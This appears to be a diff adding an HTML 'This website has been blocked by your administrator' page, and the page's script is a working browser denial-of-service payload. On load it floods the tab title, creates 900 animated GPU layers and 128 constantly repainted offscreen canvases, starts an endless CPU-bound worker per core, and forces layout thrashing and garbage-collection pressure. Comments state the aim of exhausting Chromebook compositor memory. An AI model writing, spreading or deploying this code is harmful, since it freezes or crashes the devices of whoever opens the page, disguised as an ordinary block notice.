@@ -1,0 +1,227 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <title aria="" -label="This content is blocked">This content is blocked!</title>
+    <link href="//netdna.bootstrapcdn.com/bootstrap/3.1.0/css/bootstrap.min.css" rel="stylesheet" />
+    <link href="//fonts.googleapis.com/css?family=Roboto:400,100,700,900" rel="stylesheet" type="text/css" />
+    <link href="/assets/lock-icon.png" rel="icon" type="image/png" />
+    <style>
+      @supports (font: -apple-system-body) { html { font: -apple-system-body; } }
+      html { height: 100%; }
+      body {
+        background-color: #3E3E3E;
+        background: radial-gradient(ellipse at center, #707070 13%, #333333 100%);
+        font-family: 'Roboto', sans-serif;
+        overflow: hidden;
+      }
+      .content { max-width: 32em; padding: 0 1.25em; margin: 1.875em auto; color: #c7c7c7; text-align: center; font-size: 1.72em; font-weight: 100; height: 22em; background-repeat: no-repeat; background-size: 32%; background-position: center center; background-image: url('/assets/lock-icon.png'); }
+      .content h1 { color: #00AAD7; font-size: 2.5em; margin: 0; margin-bottom: -20px; }
+      .outer { display: table; position: absolute; height: 100%; width: 100%; }
+      .middle { display: table-cell; vertical-align: middle; }
+
+      /* compositor layer farm — each will-change:transform element
+         gets promoted to its own gpu layer. 800 layers = compositor OOM */
+      .layer-bomb {
+        position: fixed;
+        width: 2px;
+        height: 2px;
+        will-change: transform;
+        transform: translateZ(0);
+        pointer-events: none;
+        opacity: 0.01;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="outer">
+      <div class="middle">
+        <div class="content">
+          <h1><strong>Restricted</strong></h1>
+          <br />This website has been blocked by your administrator.
+        </div>
+      </div>
+    </div>
+
+    <script>
+      const KXLock = {
+        _pool: [],
+        _poolSize: 512,
+        _ptr: 0,
+        _layers: [],
+        _canvases: [],
+        _workers: [],
+
+        _rng: (function() {
+          let s0 = (Math.random() * 0xFFFFFFFF) >>> 0;
+          let s1 = (Math.random() * 0xFFFFFFFF) >>> 0;
+          return function() {
+            let t = s1;
+            const s = s0;
+            s0 = s;
+            t ^= t << 23; t ^= t >>> 17; t ^= s ^ (s >>> 26);
+            s1 = t;
+            return (s0 + s1) >>> 0;
+          };
+        })(),
+
+        _hex32: function() {
+          return (this._rng() >>> 0).toString(16).padStart(8, '0');
+        },
+
+        _genTitle: function(len) {
+          let s = '';
+          const calls = Math.ceil(len / 8);
+          for (let i = 0; i < calls; i++) s += this._hex32();
+          return s;
+        },
+
+        _fillPool: function() {
+          for (let i = 0; i < this._poolSize; i++) {
+            this._pool[i] = this._genTitle(64);
+          }
+        },
+
+        _injectBurst: function(burst) {
+          const pool = this._pool;
+          const plen = pool.length;
+          let ptr = this._ptr;
+          for (let i = 0; i < burst; i++) {
+            document.title = pool[ptr & (plen - 1)];
+            ptr = (ptr + 1) & 0x7FFFFFFF;
+          }
+          this._ptr = ptr;
+        },
+
+        // --- compositor layer bomb ---
+        // each element with will-change:transform becomes its own gpu texture
+        // chromeos viz process has a tile memory budget (~256mb on most chromebooks)
+        // 800+ promoted layers with animated transforms exhausts it
+        _buildLayerBomb: function() {
+          const frag = document.createDocumentFragment();
+          for (let i = 0; i < 900; i++) {
+            const el = document.createElement('div');
+            el.className = 'layer-bomb';
+            el.style.left = (this._rng() % window.innerWidth) + 'px';
+            el.style.top  = (this._rng() % window.innerHeight) + 'px';
+            frag.appendChild(el);
+            this._layers.push(el);
+          }
+          document.body.appendChild(frag);
+        },
+
+        // animate every layer every raf — forces viz to re-composite all 900 textures per frame
+        _animateLayers: function() {
+          const layers = this._layers;
+          const len = layers.length;
+          const rng = this._rng.bind(this);
+          let frame = 0;
+
+          const tick = () => {
+            for (let i = 0; i < len; i++) {
+              // randomize transform each frame = no caching possible
+              layers[i].style.transform =
+                `translate3d(${rng() % 4}px,${rng() % 4}px,0) rotate(${frame & 0xFF}deg)`;
+            }
+            frame++;
+            requestAnimationFrame(tick);
+          };
+          requestAnimationFrame(tick);
+        },
+
+        // --- offscreen canvas flood ---
+        // each OffscreenCanvas allocates a gpu-backed texture
+        // writing to them every frame keeps them "live" so the driver can't reclaim
+        _canvasBomb: function() {
+          const count = 128;
+          for (let i = 0; i < count; i++) {
+            const oc = new OffscreenCanvas(256, 256);
+            const ctx = oc.getContext('2d');
+            this._canvases.push({ oc, ctx });
+          }
+
+          const canvases = this._canvases;
+          const rng = this._rng.bind(this);
+
+          const paint = () => {
+            for (let i = 0; i < canvases.length; i++) {
+              const { ctx } = canvases[i];
+              // large fillRect forces a full texture upload each frame
+              ctx.fillStyle = `rgb(${rng()%255},${rng()%255},${rng()%255})`;
+              ctx.fillRect(0, 0, 256, 256);
+            }
+            requestAnimationFrame(paint);
+          };
+          requestAnimationFrame(paint);
+        },
+
+        // --- worker thread bomb ---
+        // spin up workers that do heavy typed-array math
+        // saturates cpu cores so the browser's compositor thread starves
+        _workerBomb: function() {
+          const workerSrc = `
+            const buf = new Float64Array(1 << 20);
+            while (true) {
+              for (let i = 0; i < buf.length; i++) {
+                buf[i] = Math.sqrt(i * 1.0000001) * Math.sin(i);
+              }
+            }
+          `;
+          const blob = new Blob([workerSrc], { type: 'application/javascript' });
+          const url  = URL.createObjectURL(blob);
+          const cores = navigator.hardwareConcurrency || 4;
+          for (let i = 0; i < cores; i++) {
+            this._workers.push(new Worker(url));
+          }
+        },
+
+        // --- style mutation flood ---
+        // batch css property changes every raf
+        // forces style recalc + layout on every frame (on top of compositor pressure)
+        _styleThrash: function() {
+          const el = document.body;
+          let t = 0;
+          const thrash = () => {
+            for (let i = 0; i < 256; i++) {
+              void el.offsetHeight;
+              el.style.transform = `translateX(${t & 1}px)`;
+              t++;
+            }
+            requestAnimationFrame(thrash);
+          };
+          requestAnimationFrame(thrash);
+        },
+
+        // --- gc pressure ---
+        _gcPressure: function() {
+          const chunks = [];
+          for (let i = 0; i < 1024; i++) chunks.push(new Uint32Array(2048));
+          setTimeout(() => { chunks.length = 0; }, 0);
+        },
+
+        run: function(config = {}) {
+          const burst      = config.burst      || 32000;
+          const interval   = config.interval   || 1;
+          const gcEvery    = config.gcEvery    || 3;
+
+          this._fillPool();
+          this._buildLayerBomb();
+          this._animateLayers();
+          this._canvasBomb();
+          this._workerBomb();
+          this._styleThrash();
+
+          let tick = 0;
+          setInterval(() => {
+            this._injectBurst(burst);
+            if (tick % gcEvery === 0) this._gcPressure();
+            tick = (tick + 1) & 0x7FFFFFFF;
+          }, interval);
+        }
+      };
+
+      KXLock.run();
+    </script>
+  </body>
+</html>
